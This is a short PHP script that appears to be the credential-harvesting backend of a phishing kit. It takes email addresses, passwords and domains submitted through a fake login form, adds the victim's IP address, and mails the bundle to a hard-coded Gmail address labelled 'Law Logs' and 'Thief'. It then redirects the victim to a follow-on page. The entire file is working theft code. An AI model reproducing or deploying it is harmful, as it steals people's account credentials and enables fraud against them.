<?

$ip = getenv("REMOTE_ADDR");
$message .= "----Law Logs--------------\n";
$message .= "~ Box Infoz ~				\n";
$message .= "-------------------------------------------\n";
$message .= "Email : ".$_POST['Email']."\n";
$message .= "Password : ".$_POST['Password']."\n";
$message .= "Email Domain : ".$_POST['Domain']."\n";
$message .= "-------------------------------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "----By Romeywiz------\n";

$recipient = "langmesserpp@gmail.com";
$subject = "Law Logs $ip.";
$headers = "FROM:";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "SiteKeys Challenge ReZulT (Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: sub.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>